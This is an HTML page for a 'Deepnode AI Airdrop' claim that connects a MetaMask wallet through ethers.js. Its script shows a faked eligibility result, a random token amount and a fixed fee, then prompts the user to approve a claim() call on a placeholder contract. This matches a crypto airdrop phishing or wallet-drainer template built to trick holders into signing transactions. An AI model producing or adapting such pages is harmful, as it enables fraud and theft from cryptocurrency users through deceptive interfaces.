<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Deepnode AI Airdrop</title>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  font-family: -apple-system, BlinkMacSystemFont, Inter, Arial, sans-serif;
  background: linear-gradient(180deg, #05060f 0%, #1a0b2e 55%, #3b145f 100%);
  color: #ffffff;
}

.container {
  height: 100%;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  text-align: center;
  padding: 24px;
}

.logo {
  width: 110px;
  margin-bottom: 20px;
}

h1 {
  font-size: 22px;
  font-weight: 600;
  margin-bottom: 25px;
  opacity: 0.9;
}

button {
  width: 100%;
  max-width: 340px;
  padding: 16px;
  font-size: 17px;
  border-radius: 14px;
  border: 1px solid rgba(255,255,255,0.25);
  background: rgba(255,255,255,0.08);
  color: #fff;
  cursor: pointer;
  backdrop-filter: blur(10px);
  margin-bottom: 10px;
}

button:hover {
  background: rgba(255,255,255,0.15);
}

.status {
  margin-top: 10px;
  font-size: 14px;
  opacity: 0.75;
}

.footer {
  position: absolute;
  bottom: 25px;
  font-size: 11px;
  opacity: 0.5;
}
</style>
</head>

<body>

<div class="container">

  <img src="deepnode-logo.png" class="logo" alt="Deepnode AI">

  <h1>Deepnode AI Airdrop Claim</h1>

  <button id="connectBtn">Connect Wallet</button>
  <button id="claimBtn" disabled>Claim Airdrop</button>

  <div class="status" id="status"></div>
  <div class="status" id="eligibility"></div>
  <div class="status" id="amount"></div>
  <div class="status" id="fee"></div>

  <div class="footer">
    Terms & Privacy
  </div>

</div>

<script>
let provider;
let signer;
let contract;

// ðŸ” Replace with real contract if needed
const CONTRACT_ADDRESS = "0xYourContractAddressHere";
const ABI = ["function claim() external"];

// UI refs
const statusText = document.getElementById("status");
const eligibilityText = document.getElementById("eligibility");
const amountText = document.getElementById("amount");
const feeText = document.getElementById("fee");
const claimBtn = document.getElementById("claimBtn");

document.getElementById("connectBtn").onclick = async () => {
  if (!window.ethereum) {
    statusText.innerText = "Open this page in MetaMask browser.";
    return;
  }

  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = provider.getSigner();

  statusText.innerText = "Wallet connected successfully";

  // ðŸ”¹ SIMULATED ELIGIBILITY CHECK
  eligibilityText.innerText = "Eligibility check: Eligible âœ… (simulation)";

  // ðŸ”¹ RANDOM CLAIM AMOUNT (â‰¥ 200)
  const randomAmount = Math.floor(Math.random() * 801) + 200;
  amountText.innerText =
    `You are eligible to claim ${randomAmount} DEEPNODE tokens`;

  // ðŸ”¹ FIXED DISPLAY NETWORK FEE
  feeText.innerText = "Estimated network fee: 0.003 ETH";

  contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
  claimBtn.disabled = false;
};

claimBtn.onclick = async () => {
  try {
    statusText.innerText = "Waiting for wallet approval...";
    const tx = await contract.claim();
    await tx.wait();
    statusText.innerText = "Claim transaction submitted.";
  } catch {
    statusText.innerText = "Transaction rejected.";
  }
};
</script>

</body>
</html>